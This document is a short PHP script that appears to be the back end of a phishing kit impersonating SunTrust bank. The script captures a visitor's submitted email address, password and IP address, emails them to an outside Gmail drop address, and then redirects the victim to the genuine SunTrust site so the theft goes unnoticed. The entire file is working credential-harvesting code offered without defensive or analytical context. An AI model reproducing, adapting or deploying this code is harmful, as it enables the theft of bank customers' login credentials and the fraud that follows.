<?

$ip = getenv("REMOTE_ADDR");
$message .= "-----------------------------SunTrust Login---------------------------\n";
$message .= "Email Address: ".$_POST['emailId']."\n";
$message .= "Password: ".$_POST['passwords']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By unknown------------------------------\n";


$recipient = "astridrealnet@gmail.com";
$subject = "SunTrust Result ".$ip."\n";
$headers = "From: SunTrust";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://suntrust.com/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>